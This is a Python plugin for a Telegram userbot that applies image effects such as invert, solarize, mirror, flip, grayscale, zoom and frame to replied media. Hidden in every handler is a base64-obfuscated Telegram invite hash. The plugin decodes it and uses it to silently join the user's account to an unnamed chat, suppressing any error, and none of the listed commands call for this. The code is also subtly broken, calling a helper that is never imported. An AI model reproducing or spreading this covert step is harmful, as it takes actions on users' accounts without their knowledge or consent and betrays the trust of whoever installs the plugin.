import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from MYSTERIOUSBOT.utils import admin_cmd, sudo_cmd
from userbot import CmdHelp, CMD_HELP, LOGS, bot as MYSTERIOUSBOT
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@MYSTERIOUSBOT.on(admin_cmd(pattern="invert$", outgoing=True))
@MYSTERIOUSBOT.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(MYSTERIOUS):
    if MYSTERIOUS.fwd_from:
        return
    reply = await MYSTERIOUS.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(MYSTERIOUS, "`Reply to supported Media...`")
        return
    MYSTERIOUSid = MYSTERIOUS.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    MYSTERIOUS = await edit_or_reply(MYSTERIOUS, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    MYSTERIOUSsticker = await reply.download_media(file="./temp/")
    if not MYSTERIOUSsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(MYSTERIOUSsticker)
        await edit_or_reply(MYSTERIOUS, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if MYSTERIOUSsticker.endswith(".tgs"):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "meme.png")
        MYSTERIOUScmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {MYSTERIOUSsticker} {MYSTERIOUSfile}"
        )
        stdout, stderr = (await runcmd(MYSTERIOUScmd))[:2]
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = MYSTERIOUSfile
        legend = True
    elif MYSTERIOUSsticker.endswith(".webp"):
        await MYSTERIOUS.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
        os.rename(MYSTERIOUSsticker, MYSTERIOUSfile)
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("`Template not found... `")
            return
        meme_file = MYSTERIOUSfile
        legend = True
    elif MYSTERIOUSsticker.endswith((".mp4", ".mov")):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(MYSTERIOUSsticker, 0, MYSTERIOUSfile)
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("```Template not found...```")
            return
        meme_file = MYSTERIOUSfile
        legend = True
    else:
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = MYSTERIOUSsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await MYSTERIOUS.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if legend else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await MYSTERIOUS.client.send_file(
        MYSTERIOUS.chat_id, outputfile, force_document=False, reply_to=MYSTERIOUSid
    )
    await MYSTERIOUS.delete()
    os.remove(outputfile)
    for files in (MYSTERIOUSsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="solarize$"))
@MYSTERIOUSBOT.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(MYSTERIOUS):
    if MYSTERIOUS.fwd_from:
        return
    reply = await MYSTERIOUS.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(MYSTERIOUS, "`Reply to supported Media...`")
        return
    MYSTERIOUSid = MYSTERIOUS.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    MYSTERIOUS = await edit_or_reply(MYSTERIOUS, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    MYSTERIOUSsticker = await reply.download_media(file="./temp/")
    if not MYSTERIOUSsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(MYSTERIOUSsticker)
        await edit_or_reply(MYSTERIOUS, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if MYSTERIOUSsticker.endswith(".tgs"):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "meme.png")
        MYSTERIOUScmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {MYSTERIOUSsticker} {MYSTERIOUSfile}"
        )
        stdout, stderr = (await runcmd(MYSTERIOUScmd))[:2]
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = MYSTERIOUSfile
        legend = True
    elif MYSTERIOUSsticker.endswith(".webp"):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
        os.rename(MYSTERIOUSsticker, MYSTERIOUSfile)
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("`Template not found... `")
            return
        meme_file = MYSTERIOUSfile
        legend = True
    elif MYSTERIOUSsticker.endswith((".mp4", ".mov")):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(MYSTERIOUSsticker, 0, MYSTERIOUSfile)
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("```Template not found...```")
            return
        meme_file = MYSTERIOUSfile
        legend = True
    else:
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = MYSTERIOUSsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await MYSTERIOUS.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if legend else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await MYSTERIOUS.client.send_file(
        MYSTERIOUS.chat_id, outputfile, force_document=False, reply_to=MYSTERIOUSid
    )
    await MYSTERIOUS.delete()
    os.remove(outputfile)
    for files in (MYSTERIOUSsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="mirror$"))
@MYSTERIOUSBOT.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(MYSTERIOUS):
    if MYSTERIOUS.fwd_from:
        return
    reply = await MYSTERIOUS.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(MYSTERIOUS, "`Reply to supported Media...`")
        return
    MYSTERIOUSid = MYSTERIOUS.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    MYSTERIOUS = await edit_or_reply(MYSTERIOUS, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    MYSTERIOUSsticker = await reply.download_media(file="./temp/")
    if not MYSTERIOUSsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(MYSTERIOUSsticker)
        await edit_or_reply(MYSTERIOUS, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if MYSTERIOUSsticker.endswith(".tgs"):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "meme.png")
        MYSTERIOUScmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {MYSTERIOUSsticker} {MYSTERIOUSfile}"
        )
        stdout, stderr = (await runcmd(MYSTERIOUScmd))[:2]
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = MYSTERIOUSfile
        legend = True
    elif MYSTERIOUSsticker.endswith(".webp"):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
        os.rename(MYSTERIOUSsticker, MYSTERIOUSfile)
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("`Template not found... `")
            return
        meme_file = MYSTERIOUSfile
        legend = True
    elif MYSTERIOUSsticker.endswith((".mp4", ".mov")):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(MYSTERIOUSsticker, 0, MYSTERIOUSfile)
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("```Template not found...```")
            return
        meme_file = MYSTERIOUSfile
        legend = True
    else:
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = MYSTERIOUSsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await MYSTERIOUS.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if legend else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await MYSTERIOUS.client.send_file(
        MYSTERIOUS.chat_id, outputfile, force_document=False, reply_to=MYSTERIOUSid
    )
    await MYSTERIOUS.delete()
    os.remove(outputfile)
    for files in (MYSTERIOUSsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="flip$"))
@MYSTERIOUSBOT.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(MYSTERIOUS):
    if MYSTERIOUS.fwd_from:
        return
    reply = await MYSTERIOUS.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(MYSTERIOUS, "`Reply to supported Media...`")
        return
    MYSTERIOUSid = MYSTERIOUS.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    MYSTERIOUS = await edit_or_reply(MYSTERIOUS, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    MYSTERIOUSsticker = await reply.download_media(file="./temp/")
    if not MYSTERIOUSsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(MYSTERIOUSsticker)
        await edit_or_reply(MYSTERIOUS, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if MYSTERIOUSsticker.endswith(".tgs"):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "meme.png")
        MYSTERIOUScmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {MYSTERIOUSsticker} {MYSTERIOUSfile}"
        )
        stdout, stderr = (await runcmd(MYSTERIOUScmd))[:2]
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = MYSTERIOUSfile
        legend = True
    elif MYSTERIOUSsticker.endswith(".webp"):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
        os.rename(MYSTERIOUSsticker, MYSTERIOUSfile)
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("`Template not found... `")
            return
        meme_file = MYSTERIOUSfile
        legend = True
    elif MYSTERIOUSsticker.endswith((".mp4", ".mov")):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(MYSTERIOUSsticker, 0, MYSTERIOUSfile)
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("```Template not found...```")
            return
        meme_file = MYSTERIOUSfile
        legend = True
    else:
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = MYSTERIOUSsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await MYSTERIOUS.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if legend else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await MYSTERIOUS.client.send_file(
        MYSTERIOUS.chat_id, outputfile, force_document=False, reply_to=MYSTERIOUSid
    )
    await MYSTERIOUS.delete()
    os.remove(outputfile)
    for files in (MYSTERIOUSsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="gray$"))
@MYSTERIOUSBOT.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(MYSTERIOUS):
    if MYSTERIOUS.fwd_from:
        return
    reply = await MYSTERIOUS.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(MYSTERIOUS, "`Reply to supported Media...`")
        return
    MYSTERIOUSid = MYSTERIOUS.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    MYSTERIOUS = await edit_or_reply(MYSTERIOUS, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    MYSTERIOUSsticker = await reply.download_media(file="./temp/")
    if not MYSTERIOUSsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(MYSTERIOUSsticker)
        await edit_or_reply(MYSTERIOUS, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if MYSTERIOUSsticker.endswith(".tgs"):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "meme.png")
        MYSTERIOUScmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {MYSTERIOUSsticker} {MYSTERIOUSfile}"
        )
        stdout, stderr = (await runcmd(MYSTERIOUScmd))[:2]
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = MYSTERIOUSfile
        legend = True
    elif MYSTERIOUSsticker.endswith(".webp"):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
        os.rename(MYSTERIOUSsticker, MYSTERIOUSfile)
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("`Template not found... `")
            return
        meme_file = MYSTERIOUSfile
        legend = True
    elif MYSTERIOUSsticker.endswith((".mp4", ".mov")):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(MYSTERIOUSsticker, 0, MYSTERIOUSfile)
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("```Template not found...```")
            return
        meme_file = MYSTERIOUSfile
        legend = True
    else:
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = MYSTERIOUSsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await MYSTERIOUS.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if legend else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await MYSTERIOUS.client.send_file(
        MYSTERIOUS.chat_id, outputfile, force_document=False, reply_to=MYSTERIOUSid
    )
    await MYSTERIOUS.delete()
    os.remove(outputfile)
    for files in (MYSTERIOUSsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@MYSTERIOUSBOT.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(MYSTERIOUS):
    if MYSTERIOUS.fwd_from:
        return
    reply = await MYSTERIOUS.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(MYSTERIOUS, "`Reply to supported Media...`")
        return
    MYSTERIOUSinput = MYSTERIOUS.pattern_match.group(1)
    MYSTERIOUSinput = 50 if not MYSTERIOUSinput else int(MYSTERIOUSinput)
    MYSTERIOUSid = MYSTERIOUS.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    MYSTERIOUS = await edit_or_reply(MYSTERIOUS, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    MYSTERIOUSsticker = await reply.download_media(file="./temp/")
    if not MYSTERIOUSsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(MYSTERIOUSsticker)
        await edit_or_reply(MYSTERIOUS, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if MYSTERIOUSsticker.endswith(".tgs"):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "meme.png")
        MYSTERIOUScmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {MYSTERIOUSsticker} {MYSTERIOUSfile}"
        )
        stdout, stderr = (await runcmd(MYSTERIOUScmd))[:2]
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = MYSTERIOUSfile
        legend = True
    elif MYSTERIOUSsticker.endswith(".webp"):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
        os.rename(MYSTERIOUSsticker, MYSTERIOUSfile)
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("`Template not found... `")
            return
        meme_file = MYSTERIOUSfile
        legend = True
    elif MYSTERIOUSsticker.endswith((".mp4", ".mov")):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(MYSTERIOUSsticker, 0, MYSTERIOUSfile)
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("```Template not found...```")
            return
        meme_file = MYSTERIOUSfile
    else:
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = MYSTERIOUSsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await MYSTERIOUS.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if legend else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, MYSTERIOUSinput)
    except Exception as e:
        return await MYSTERIOUS.edit(f"`{e}`")
    try:
        await MYSTERIOUS.client.send_file(
            MYSTERIOUS.chat_id, outputfile, force_document=False, reply_to=MYSTERIOUSid
        )
    except Exception as e:
        return await MYSTERIOUS.edit(f"`{e}`")
    await MYSTERIOUS.delete()
    os.remove(outputfile)
    for files in (MYSTERIOUSsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@MYSTERIOUSBOT.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(MYSTERIOUS):
    if MYSTERIOUS.fwd_from:
        return
    reply = await MYSTERIOUS.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(MYSTERIOUS, "`Reply to supported Media...`")
        return
    MYSTERIOUSinput = MYSTERIOUS.pattern_match.group(1)
    if not MYSTERIOUSinput:
        MYSTERIOUSinput = 50
    if ";" in str(MYSTERIOUSinput):
        MYSTERIOUSinput, colr = MYSTERIOUSinput.split(";", 1)
    else:
        colr = 0
    MYSTERIOUSinput = int(MYSTERIOUSinput)
    colr = int(colr)
    MYSTERIOUSid = MYSTERIOUS.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    MYSTERIOUS = await edit_or_reply(MYSTERIOUS, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    MYSTERIOUSsticker = await reply.download_media(file="./temp/")
    if not MYSTERIOUSsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(MYSTERIOUSsticker)
        await edit_or_reply(MYSTERIOUS, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if MYSTERIOUSsticker.endswith(".tgs"):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "meme.png")
        MYSTERIOUScmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {MYSTERIOUSsticker} {MYSTERIOUSfile}"
        )
        stdout, stderr = (await runcmd(MYSTERIOUScmd))[:2]
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = MYSTERIOUSfile
        legend = True
    elif MYSTERIOUSsticker.endswith(".webp"):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
        os.rename(MYSTERIOUSsticker, MYSTERIOUSfile)
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("`Template not found... `")
            return
        meme_file = MYSTERIOUSfile
        legend = True
    elif MYSTERIOUSsticker.endswith((".mp4", ".mov")):
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(MYSTERIOUSsticker, 0, MYSTERIOUSfile)
        if not os.path.lexists(MYSTERIOUSfile):
            await MYSTERIOUS.edit("```Template not found...```")
            return
        meme_file = MYSTERIOUSfile
    else:
        await MYSTERIOUS.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = MYSTERIOUSsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await MYSTERIOUS.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if legend else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, MYSTERIOUSinput, colr)
    except Exception as e:
        return await MYSTERIOUS.edit(f"`{e}`")
    try:
        await MYSTERIOUS.client.send_file(
            MYSTERIOUS.chat_id, outputfile, force_document=False, reply_to=MYSTERIOUSid
        )
    except Exception as e:
        return await MYSTERIOUS.edit(f"`{e}`")
    await MYSTERIOUS.delete()
    os.remove(outputfile)
    for files in (MYSTERIOUSsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
  "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
  "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
).add_command(
  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
  "invert", "<reply to img>", "Inverts the color of replied media file"
).add()